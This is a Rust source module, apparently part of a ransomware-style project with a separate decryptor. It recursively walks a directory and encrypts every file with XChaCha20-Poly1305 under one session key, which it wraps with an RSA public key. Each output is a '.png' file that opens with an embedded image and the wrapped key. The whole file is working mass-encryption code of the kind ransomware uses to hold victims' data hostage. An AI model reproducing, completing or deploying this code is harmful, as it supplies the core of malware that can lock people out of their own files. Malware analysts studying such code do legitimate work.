use std::fs::{File, OpenOptions};
use std::io::{Read, Write};
use std::path::{Path, PathBuf};
use anyhow::Context;
use chacha20poly1305::aead::OsRng;
use chacha20poly1305::aead::stream::EncryptorBE32;
use chacha20poly1305::{KeyInit, XChaCha20Poly1305};
use rand::prelude::ThreadRng;
use rand::RngCore;
use rsa::{Oaep, RsaPublicKey};
use sha2::Sha512;
use decryptor::helpers::gen_new_path;
use crate::BIGRAT_PNG;

const BUFFER_SIZE: usize = 500;

fn encrypt_file(
    source_file: &mut File,
    dist_path: &Path,
    encrypted_key: &[u8],
    encrypted_nonce: &[u8],
    aead: XChaCha20Poly1305,
    nonce: &[u8],
) -> anyhow::Result<()> {
    let mut dist_file = OpenOptions::new()
        .append(true)
        .create(true)
        .open(dist_path)
        .with_context(|| format!("Failed to create or open a destination file {}", dist_path.display()))?;

    dist_file.set_len(0)?;
    dist_file.write_all(BIGRAT_PNG)?;

    dist_file.write_all(encrypted_key)?;
    dist_file.write_all(encrypted_nonce)?;

    let mut stream_encryptor = EncryptorBE32::from_aead(aead, nonce.as_ref().into());

    let mut buffer = [0u8; BUFFER_SIZE];
    loop {
        let read_count = source_file.read(&mut buffer)?;
        if read_count == BUFFER_SIZE {
            let ciphertext = stream_encryptor.encrypt_next(buffer.as_slice()).unwrap();
            let _ = dist_file.write(&ciphertext)?;
        } else {
            let ciphertext = stream_encryptor.encrypt_last(&buffer[..read_count]).unwrap();
            let _ = dist_file.write(&ciphertext)?;
            break;
        }
    }

    Ok(())
}

pub fn encrypt_everything(path: &Path, public_key: &RsaPublicKey, rng: &mut ThreadRng) -> anyhow::Result<()> {
    let mut key = [0u8; 32];
    let mut nonce = [0u8; 19];
    OsRng.fill_bytes(&mut key);
    OsRng.fill_bytes(&mut nonce);

    let encrypted_key = public_key.encrypt(rng, Oaep::new::<Sha512>(), &key)
        .with_context(|| "Failed to encrypt the key")?;
    let encrypted_nonce = public_key.encrypt(rng, Oaep::new::<Sha512>(), &nonce)
        .with_context(|| "Failed to encrypt the nonce")?;

    let aead = XChaCha20Poly1305::new(key.as_ref().into());

    for entry in path.read_dir()? {
        let entry = entry?;
        if entry.file_type()?.is_dir() {
            encrypt_everything(&entry.path(), public_key, rng)?;
            continue;
        }

        let mut file = match File::open(entry.path()) {
            Ok(file) => file,
            Err(e) => {
                eprintln!("Failed to open file {}: {}", entry.path().display(), e);
                continue;
            },
        };

        let new_path = match gen_new_path(
            PathBuf::from(&format!("{}.png", entry.path().display())),
            false,
        ) {
            Ok(path) => path,
            Err(e) => {
                eprintln!("Failed to generate a destination file name from source file {:?}: {}", entry.path(), e);
                continue;
            }
        };

        if let Err(e) = encrypt_file(
            &mut file,
            &new_path,
            encrypted_key.as_slice(),
            encrypted_nonce.as_slice(),
            aead.clone(),
            nonce.as_ref(),
        ) {
            eprintln!("Failed to encrypt a file {:?}: {}", entry.path(), e);
            continue;
        };
    }
    Ok(())
}
